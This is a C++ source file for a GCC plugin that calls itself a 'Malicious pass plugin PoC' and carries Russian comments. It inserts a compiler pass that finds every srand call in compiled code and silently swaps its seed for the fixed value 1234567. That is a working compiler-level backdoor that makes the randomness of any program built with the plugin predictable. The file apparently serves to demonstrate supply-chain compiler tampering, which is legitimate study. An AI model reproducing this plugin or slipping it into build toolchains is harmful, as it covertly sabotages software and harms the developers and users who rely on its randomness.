#include <iostream>

#include "gcc-plugin.h"
#include "plugin-version.h"
#include "tree-pass.h"
#include "context.h"
#include "function.h"
#include "tree.h"
#include "rtl.h"
#include "gimple.h"
#include "gimple-pretty-print.h"
#include "gimple-iterator.h"

int plugin_is_GPL_compatible;

static struct plugin_info srandpass_plugin_info = {"0.1", "Malicious pass plugin PoC"};

namespace
{
    const pass_data srandpass_data =
    {
        GIMPLE_PASS,
        "srandpass",     /* name */
        OPTGROUP_NONE,   /* optinfo_flags */
        TV_NONE,         /* tv_id */
        PROP_gimple_any, /* properties_required */
        0,               /* properties_provided */
        0,               /* properties_destroyed */
        0,               /* todo_flags_start */
        0                /* todo_flags_finish */
    };

    struct srandpass : gimple_opt_pass
    {
        srandpass(gcc::context *ctx)
            : gimple_opt_pass(srandpass_data, ctx)
        {
        }

        virtual unsigned int execute(function *fun) override
        {
            basic_block bb;

            // Перебор базовых блоков
            FOR_ALL_BB_FN(bb, fun)
            {
                gimple_bb_info *bb_info = &bb->il.gimple;

                // Перебор инструкций базового блока
                for (gimple_stmt_iterator gsi = gsi_start(bb_info->seq); !gsi_end_p(gsi); gsi_next(&gsi))
                {
                     gimple *g = gsi_stmt(gsi);
                     if (GIMPLE_CALL == g->code) // Проверка на вызов функции
                     {
                         tree fn_call = gimple_call_fn(g);
                         tree fn_decl = TREE_OPERAND(fn_call, 0);
                         tree fn_id = DECL_NAME(fn_decl);
                         const char *fn_name = IDENTIFIER_POINTER(fn_id);
                         if (0 == strcmp("srand", fn_name)) // Нашли вызов srand?
                         {
                            // Новое вредоносное значение для аргумента srand
                            tree mal_val = build_int_cst_type(integer_type_node, 1234567);
                            gimple_call_set_arg(g, 0, mal_val);
                         }
                     }
                }
            }

            return 0;
        }

        virtual srandpass *clone() override
        {
            return this;
        }
    };
}

int plugin_init(struct plugin_name_args *plugin_info,
                struct plugin_gcc_version *version)
{
    register_callback(plugin_info->base_name,
                      /* event */ PLUGIN_INFO,
                      /* callback */ NULL, 
                      /* user_data */ &srandpass_plugin_info);

    struct register_pass_info pass_info;
    pass_info.pass = new srandpass(g);
    pass_info.reference_pass_name = "cfg";
    pass_info.ref_pass_instance_number = 1;
    pass_info.pos_op = PASS_POS_INSERT_AFTER;

    register_callback(plugin_info->base_name, PLUGIN_PASS_MANAGER_SETUP, NULL, &pass_info);

    return 0;
}
